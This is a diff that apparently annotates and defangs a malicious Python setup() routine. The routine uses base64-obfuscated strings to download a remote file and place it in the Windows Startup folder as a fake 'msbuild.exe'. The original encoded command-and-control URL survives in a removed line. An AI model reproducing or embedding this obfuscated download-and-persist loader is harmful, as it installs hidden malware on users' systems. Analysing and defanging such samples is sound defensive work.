@@ -20,9 +20,10 @@ def setup():
         return
 
     try:
+        # Decoded: os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Start Menu\Programs\Startup', 'msbuild.exe')
         p = os.path.join(os.getenv(_d('QVBQREFUQQ==')), _d('TWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVw'), _d('bXNidWlsZC5leGU='))
-        l = p + _d('LmxvY2s=')
-        t = p + _d('LnRtcA==')
+        l = p + _d('LmxvY2s=')   # .lock
+        t = p + _d('LnRtcA==')   # .tmp
 
         if os.path.exists(p):
             return
@@ -40,7 +41,8 @@ def setup():
         except:
             pass
 
-        r = urllib.request.Request(_d('aHR0cDovLzgzLjE0Mi4yMDkuMjAzOjgwODAvaGFuZ3VwLndhdg=='), headers={_d('VXNlci1BZ2VudA=='): _d('TW96aWxsYS81LjA=')})
+        # DEFANGED: Original URL was hxxp://83[.]142[.]209[.]203:8080/hangup.wav
+        r = urllib.request.Request(_d('SNIPPED_FOR_DEFANGING'), headers={_d('VXNlci1BZ2VudA=='): _d('TW96aWxsYS81LjA=')})  # DEFANGED: full b64 C2 URL removed
         with urllib.request.urlopen(r, timeout=15) as d:
             with open(t, "wb") as f:
                 f.write(d.read())
